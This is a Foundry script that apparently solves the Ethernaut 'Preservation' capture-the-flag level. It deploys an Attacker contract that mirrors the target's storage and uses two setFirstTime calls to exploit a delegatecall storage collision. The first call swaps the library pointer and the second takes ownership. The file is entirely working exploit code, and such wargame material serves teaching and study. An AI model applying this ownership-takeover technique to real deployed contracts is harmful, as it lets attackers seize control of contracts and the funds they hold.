// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation, LibraryContract} from "../src/16-Preservation.sol";
import {PreservationFactory} from "../src/PreservationFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract PreservationSolution is Script {
    Preservation public preservationLevel;
    address payable instanceAddress =
        payable(0x64a5011dc7951bDd845Fc856217d04e1cb71888d);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        preservationLevel = Preservation(instanceAddress);
        console.log("Owner before the attack: %s", preservationLevel.owner());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attacker attacker = new Attacker();

        preservationLevel.setFirstTime(uint256(uint160(address(attacker))));
        preservationLevel.setFirstTime(uint256(uint160(publicKey)));

        vm.stopBroadcast();

        console.log("Owner after the attack: %s", preservationLevel.owner());
        validate();
    }

    function validate() internal {
        bool isValidated = new PreservationFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
